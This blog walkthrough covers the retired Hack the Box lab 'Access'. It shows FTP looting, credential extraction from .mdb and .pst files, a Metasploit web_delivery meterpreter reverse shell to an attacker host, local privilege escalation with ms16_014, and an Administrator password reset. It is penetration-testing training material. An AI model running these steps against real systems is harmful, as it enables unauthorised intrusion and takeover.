@@ -1,0 +1,459 @@
+
+								
+																		Hack the Box Access: Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 3, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Access”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Easy
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of Access is 10.10.10.98.
+Penetrating Methodologies:
+
+Network scanning (nmap).
+Logging in FTP using Anonymous Login.
+Using strings to read contents of the .mdb file.
+Unzipping Zip file using 7z.
+Using readpst to read the contents of the .pst file.
+Finding Login Credentials
+Logging into Telnet.
+Finding the first flag user.txt
+Using web delivery module to create PowerShell code.
+Getting Meterpreter.
+Using exploit suggester of Metasploit.
+Getting Root Access.
+Changing the Administrator password using net user.
+Reading Our Final flag root.txt
+
+Walkthrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 10.10.10.98
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 10.10.10.98
+					
+				
+			
+		
+
+
+The first thing that got our attention is that we have anonymous access to the ftp server. Let’s login and see what we find.
+After successfully logging into FTP server, we have enumerated directories from where we have downloaded two files Access Control.zip and backup.mdb. They might come in handy later on.
+
+		
+		
+			
+			
+			
+			
+ftp 10.10.10.98
+			
+				
+					
+				
+					1
+				
+						ftp 10.10.10.98
+					
+				
+			
+		
+
+When we tried to unzip the zip file found out that it was password protected. So we tried to open the backup.mdb file and found a password to the zip file.
+
+		
+		
+			
+			
+			
+			
+strings backup.mdb | grep access
+			
+				
+					
+				
+					1
+				
+						strings backup.mdb | grep access
+					
+				
+			
+		
+
+
+Once we have obtained the password for the Access Control.zip. Time to unzip it. After unzipping we saw its a .pst which is a Microsoft Exchange Format for mailboxes. Using readpst it converted the file into the .mbox format.
+
+		
+		
+			
+			
+			
+			
+7z x Access\ Control.zip
+readpst 'Access Control.pst'
+			
+				
+					
+				
+					12
+				
+						7z x Access\ Control.zipreadpst 'Access Control.pst'
+					
+				
+			
+		
+
+Let’s read the contents of the Access Control.mbox.
+
+		
+		
+			
+			
+			
+			
+less 'Access Control.mbox'
+			
+				
+					
+				
+					1
+				
+						less 'Access Control.mbox'
+					
+				
+			
+		
+
+
+After reading the contents, we saw that user credentials that surely going to help us to move ahead.
+
+		
+		
+			
+			
+			
+			
+Username- security
+Password- 4Cc3ssC0ntr0ller
+			
+				
+					
+				
+					12
+				
+						Username- securityPassword- 4Cc3ssC0ntr0ller
+					
+				
+			
+		
+
+
+Let’s login into telnet using our new credentials. After enumerating through directories, we have found our first flag.
+
+		
+		
+			
+			
+			
+			
+telnet 10.10.10.98
+dir
+cd Desktop
+type user.txt
+			
+				
+					
+				
+					1234
+				
+						telnet 10.10.10.98dircd Desktoptype user.txt
+					
+				
+			
+		
+
+ 
+Let’s create a shellcode generated via the web delivery module of Metasploit.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.6
+exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/script/web_deliveryset target 2set payload windows/x64/meterpreter/reverse_tcpset lhost 10.10.14.6exploit
+					
+				
+			
+		
+
+
+Now we will execute the PowerShell code generated via the web delivery module.
+
+We have successfully got the meterpreter. Moving forward.
+
+		
+		
+			
+			
+			
+			
+getuid
+getsystem
+sysinfo
+			
+				
+					
+				
+					123
+				
+						getuidgetsystemsysinfo
+					
+				
+			
+		
+
+
+After that, we have used exploit suggester which has given us all the possible exploits for the operating system of the Victims system.
+
+		
+		
+			
+			
+			
+			
+use post/multi/recon/local_exploit_suggester
+set session 1
+exploit
+			
+				
+					
+				
+					123
+				
+						use post/multi/recon/local_exploit_suggesterset session 1exploit
+					
+				
+			
+		
+
+
+Using the exploit ms16_014_wmirecv_notif of Metasploit.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set lhost 10.10.14.6
+set session 1
+set lport 1234
+exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/windows/local/ms16_014_wmi_recv_notifset lhost 10.10.14.6set session 1set lport 1234exploit
+					
+				
+			
+		
+
+oh yeah! We have got the root access.
+
+		
+		
+			
+			
+			
+			
+whoami
+			
+				
+					
+				
+					1
+				
+						whoami
+					
+				
+			
+		
+
+
+Now we changed the password for Administrator because we can use it to login via telnet.
+
+		
+		
+			
+			
+			
+			
+net user
+net user Administrator Ignite@123
+			
+				
+					
+				
+					12
+				
+						net usernet user Administrator Ignite@123
+					
+				
+			
+		
+
+
+Here we successfully logged in via Telnet and found our final flag.
+
+		
+		
+			
+			
+			
+			
+telnet 10.10.10.98
+login: administrator
+password: Ignite@123
+cd Desktop
+type root.txt
+			
+				
+					
+				
+					12345
+				
+						telnet 10.10.10.98login: administratorpassword: Ignite@123cd Desktoptype root.txt
+					
+				
+			
+		
+
+
+Author: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Shashank March 13, 2019 at 11:03 am							
+							
+							
+														
+							
+								Nice
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
